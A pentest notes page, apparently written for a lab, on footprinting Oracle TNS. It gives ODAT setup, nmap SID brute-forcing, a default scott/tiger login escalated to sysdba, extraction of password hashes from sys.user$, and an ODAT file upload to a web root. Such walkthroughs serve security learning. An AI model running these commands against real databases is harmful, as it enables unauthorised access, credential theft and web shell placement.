# Oracle Transparent Network Substrate

## Footprinting The Service

### Tool Setup

{% code overflow="wrap" %}
```
sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools</p></figcaption></figure>

### Nmap

{% code overflow="wrap" %}
```
sudo nmap -p1521 -sV 10.129.204.235 --open
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Nmap - SID Bruteforcing

{% code overflow="wrap" %}
```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **ODAT**

{% code overflow="wrap" %}
```
./odat.py all -s 10.129.204.235
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p> the <code>odat.py</code> tool to perform a variety of scans like retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations etc.</p></figcaption></figure>

### **SQLplus - Log In**

{% code overflow="wrap" %}
```
sqlplus scott/tiger@10.129.204.235/XE
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>You can also attempt to append "as sysdba" for higher privileges</p></figcaption></figure>

If you come across the following error <mark style="color:red;">sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory</mark> execute the following command

{% code overflow="wrap" %}
```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
{% endcode %}

### Oracle RDBMS - Interaction

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Oracle RDBMS - Database Enumeration**

{% code overflow="wrap" %}
```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption><p>Try using the valid account to log in as the System Database Admin (<code>sysdba</code>), giving higher privileges. This is possible when the user has the appropriate privileges typically granted by the database administrator.</p></figcaption></figure>

### **Oracle RDBMS - Extract Password Hashes**

{% code overflow="wrap" %}
```
select name, password from sys.user$;
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Oracle RDBMS - File Upload**

| OS      | Path                 |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

{% code overflow="wrap" %}
```
echo "Oracle File Upload Test" > testing.txt
```
{% endcode %}

{% code overflow="wrap" %}
```
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
curl -X GET http://10.129.204.235/testing.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

